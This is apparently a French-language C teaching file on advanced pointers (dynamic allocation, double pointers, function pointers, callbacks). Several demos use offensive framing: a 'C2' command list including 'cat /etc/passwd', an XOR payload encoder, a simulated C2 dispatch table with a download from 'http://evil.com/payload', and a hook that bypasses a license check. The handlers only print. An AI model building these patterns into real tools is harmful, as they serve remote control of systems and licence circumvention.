/*
 * Module 10 : Pointeurs Avancés
 *
 * Description : Démonstration complète des concepts avancés de pointeurs
 * Compilation : gcc -o example example.c
 * Exécution  : ./example
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// ============================================================================
// DEMO 1 : Allocation dynamique (malloc, free)
// ============================================================================
void demo_malloc_free(void) {
    printf("=== DEMO 1 : malloc et free ===\n\n");

    int size = 5;
    int *arr = (int *)malloc(size * sizeof(int));

    if (arr == NULL) {
        printf("Erreur d'allocation!\n");
        return;
    }

    printf("Tableau alloué à l'adresse: %p\n", (void*)arr);

    for (int i = 0; i < size; i++) {
        arr[i] = (i + 1) * 10;
    }

    printf("Contenu: ");
    for (int i = 0; i < size; i++) {
        printf("%d ", arr[i]);
    }
    printf("\n");

    free(arr);
    arr = NULL;
    printf("Mémoire libérée\n\n");
}

// ============================================================================
// DEMO 2 : calloc (allocation initialisée à zéro)
// ============================================================================
void demo_calloc(void) {
    printf("=== DEMO 2 : calloc ===\n\n");

    int size = 5;

    int *arr1 = (int *)malloc(size * sizeof(int));
    printf("malloc (potentiellement garbage): ");
    for (int i = 0; i < size; i++) {
        arr1[i] = i;  // Initialisation manuelle
        printf("%d ", arr1[i]);
    }
    printf("\n");
    free(arr1);

    int *arr2 = (int *)calloc(size, sizeof(int));
    printf("calloc (initialisé à zéro): ");
    for (int i = 0; i < size; i++) {
        printf("%d ", arr2[i]);
    }
    printf("\n\n");
    free(arr2);
}

// ============================================================================
// DEMO 3 : realloc (redimensionnement)
// ============================================================================
void demo_realloc(void) {
    printf("=== DEMO 3 : realloc ===\n\n");

    int *arr = malloc(3 * sizeof(int));
    arr[0] = 10; arr[1] = 20; arr[2] = 30;

    printf("Tableau initial (3 éléments): ");
    for (int i = 0; i < 3; i++) printf("%d ", arr[i]);
    printf("\n");

    arr = realloc(arr, 5 * sizeof(int));
    arr[3] = 40; arr[4] = 50;

    printf("Après realloc (5 éléments): ");
    for (int i = 0; i < 5; i++) printf("%d ", arr[i]);
    printf("\n\n");

    free(arr);
}

// ============================================================================
// DEMO 4 : Pointeur de pointeur (int **)
// ============================================================================
void demo_pointer_to_pointer(void) {
    printf("=== DEMO 4 : Pointeur de pointeur ===\n\n");

    int x = 42;
    int *p = &x;
    int **pp = &p;

    printf("x    = %d\n", x);
    printf("*p   = %d\n", *p);
    printf("**pp = %d\n\n", **pp);

    printf("&x   = %p\n", (void*)&x);
    printf("p    = %p\n", (void*)p);
    printf("*pp  = %p\n", (void*)*pp);
    printf("pp   = %p\n", (void*)pp);
    printf("&p   = %p\n\n", (void*)&p);

    **pp = 100;
    printf("Après **pp = 100 : x = %d\n\n", x);
}

// ============================================================================
// DEMO 5 : Allocation via pointeur de pointeur
// ============================================================================
void allocate_array(int **ptr, int size) {
    *ptr = malloc(size * sizeof(int));
    for (int i = 0; i < size; i++) {
        (*ptr)[i] = i * i;
    }
}

void demo_alloc_via_double_ptr(void) {
    printf("=== DEMO 5 : Allocation via int ** ===\n\n");

    int *data = NULL;
    printf("Avant: data = %p\n", (void*)data);

    allocate_array(&data, 5);
    printf("Après: data = %p\n", (void*)data);

    printf("Contenu (i^2): ");
    for (int i = 0; i < 5; i++) {
        printf("%d ", data[i]);
    }
    printf("\n\n");

    free(data);
}

// ============================================================================
// DEMO 6 : Tableau de pointeurs (char **)
// ============================================================================
void demo_array_of_pointers(void) {
    printf("=== DEMO 6 : Tableau de pointeurs ===\n\n");

    char *commands[] = {
        "whoami",
        "pwd",
        "ls -la",
        "cat /etc/passwd",
        NULL
    };

    printf("Commandes C2:\n");
    for (int i = 0; commands[i] != NULL; i++) {
        printf("  [%d] %s\n", i, commands[i]);
    }
    printf("\n");
}

// ============================================================================
// DEMO 7 : Matrice dynamique (int **)
// ============================================================================
void demo_dynamic_matrix(void) {
    printf("=== DEMO 7 : Matrice dynamique ===\n\n");

    int rows = 3, cols = 4;

    int **matrix = malloc(rows * sizeof(int *));
    for (int i = 0; i < rows; i++) {
        matrix[i] = malloc(cols * sizeof(int));
    }

    for (int i = 0; i < rows; i++) {
        for (int j = 0; j < cols; j++) {
            matrix[i][j] = i * cols + j;
        }
    }

    printf("Matrice %dx%d:\n", rows, cols);
    for (int i = 0; i < rows; i++) {
        printf("  ");
        for (int j = 0; j < cols; j++) {
            printf("%3d ", matrix[i][j]);
        }
        printf("\n");
    }
    printf("\n");

    for (int i = 0; i < rows; i++) {
        free(matrix[i]);
    }
    free(matrix);
}

// ============================================================================
// DEMO 8 : Pointeurs de fonctions
// ============================================================================
int add(int a, int b) { return a + b; }
int subtract(int a, int b) { return a - b; }
int multiply(int a, int b) { return a * b; }

void demo_function_pointers(void) {
    printf("=== DEMO 8 : Pointeurs de fonctions ===\n\n");

    int (*operation)(int, int);

    operation = add;
    printf("add(10, 5) = %d\n", operation(10, 5));

    operation = subtract;
    printf("subtract(10, 5) = %d\n", operation(10, 5));

    operation = multiply;
    printf("multiply(10, 5) = %d\n\n", operation(10, 5));
}

// ============================================================================
// DEMO 9 : Tableau de pointeurs de fonctions
// ============================================================================
typedef int (*math_op)(int, int);

void demo_function_pointer_array(void) {
    printf("=== DEMO 9 : Tableau de pointeurs de fonctions ===\n\n");

    const char *names[] = {"add", "subtract", "multiply"};
    math_op operations[] = {add, subtract, multiply};

    int a = 20, b = 4;
    for (int i = 0; i < 3; i++) {
        printf("%s(%d, %d) = %d\n", names[i], a, b, operations[i](a, b));
    }
    printf("\n");
}

// ============================================================================
// DEMO 10 : Callbacks
// ============================================================================
void process_array(int *arr, int size, void (*callback)(int)) {
    for (int i = 0; i < size; i++) {
        callback(arr[i]);
    }
    printf("\n");
}

void print_value(int x) { printf("%d ", x); }
void print_doubled(int x) { printf("%d ", x * 2); }
void print_hex(int x) { printf("0x%X ", x); }

void demo_callbacks(void) {
    printf("=== DEMO 10 : Callbacks ===\n\n");

    int data[] = {10, 20, 30, 40, 50};

    printf("Normal:  "); process_array(data, 5, print_value);
    printf("Doubled: "); process_array(data, 5, print_doubled);
    printf("Hex:     "); process_array(data, 5, print_hex);
    printf("\n");
}

// ============================================================================
// DEMO 11 : Application offensive - Encodeur modulaire
// ============================================================================
typedef void (*encoder_t)(unsigned char *, int);

void xor_encoder(unsigned char *data, int len) {
    for (int i = 0; i < len; i++) data[i] ^= 0x42;
}

void add_encoder(unsigned char *data, int len) {
    for (int i = 0; i < len; i++) data[i] += 5;
}

void sub_encoder(unsigned char *data, int len) {
    for (int i = 0; i < len; i++) data[i] -= 5;
}

void demo_modular_encoder(void) {
    printf("=== DEMO 11 : Encodeur modulaire ===\n\n");

    unsigned char payload[] = "ATTACK";
    int len = strlen((char*)payload);

    printf("Original: %s\n", payload);

    xor_encoder(payload, len);
    printf("XOR 0x42: ");
    for (int i = 0; i < len; i++) printf("%02X ", payload[i]);
    printf("\n");

    xor_encoder(payload, len);
    printf("Décodé:   %s\n\n", payload);
}

// ============================================================================
// DEMO 12 : Application offensive - Table de dispatch C2
// ============================================================================
typedef struct {
    const char *name;
    void (*handler)(const char *);
} Command;

void cmd_whoami(const char *arg) { printf("  [+] User: root\n"); }
void cmd_download(const char *arg) { printf("  [+] Downloading: %s\n", arg); }
void cmd_execute(const char *arg) { printf("  [+] Executing: %s\n", arg); }

void demo_c2_dispatch(void) {
    printf("=== DEMO 12 : Table de dispatch C2 ===\n\n");

    Command commands[] = {
        {"whoami", cmd_whoami},
        {"download", cmd_download},
        {"execute", cmd_execute},
        {NULL, NULL}
    };

    const char *tests[][2] = {
        {"whoami", ""},
        {"download", "http://evil.com/payload"},
        {"execute", "calc.exe"},
        {"unknown", "test"}
    };

    for (int i = 0; i < 4; i++) {
        const char *cmd = tests[i][0];
        const char *arg = tests[i][1];

        printf("[*] Command: %s %s\n", cmd, arg);

        int found = 0;
        for (int j = 0; commands[j].name != NULL; j++) {
            if (strcmp(cmd, commands[j].name) == 0) {
                commands[j].handler(arg);
                found = 1;
                break;
            }
        }
        if (!found) printf("  [-] Unknown command\n");
    }
    printf("\n");
}

// ============================================================================
// DEMO 13 : Hooking simple
// ============================================================================
int (*original_license_check)(int) = NULL;

int real_license_check(int key) { return (key == 12345); }
int hooked_license_check(int key) {
    printf("  [HOOK] Bypassed!\n");
    return 1;
}

void demo_function_hooking(void) {
    printf("=== DEMO 13 : Function Hooking ===\n\n");

    original_license_check = real_license_check;
    printf("Normal (key=99999): %s\n",
           original_license_check(99999) ? "VALID" : "INVALID");

    original_license_check = hooked_license_check;
    printf("Hooked (key=99999): ");
    printf("%s\n\n", original_license_check(99999) ? "VALID" : "INVALID");
}

// ============================================================================
// MAIN
// ============================================================================
int main(void) {
    printf("================================================================\n");
    printf("       MODULE 10 : POINTEURS AVANCÉS - DEMONSTRATIONS\n");
    printf("================================================================\n\n");

    demo_malloc_free();
    demo_calloc();
    demo_realloc();
    demo_pointer_to_pointer();
    demo_alloc_via_double_ptr();
    demo_array_of_pointers();
    demo_dynamic_matrix();
    demo_function_pointers();
    demo_function_pointer_array();
    demo_callbacks();
    demo_modular_encoder();
    demo_c2_dispatch();
    demo_function_hooking();

    printf("================================================================\n");
    printf("                  FIN DES DEMONSTRATIONS\n");
    printf("================================================================\n");

    return 0;
}
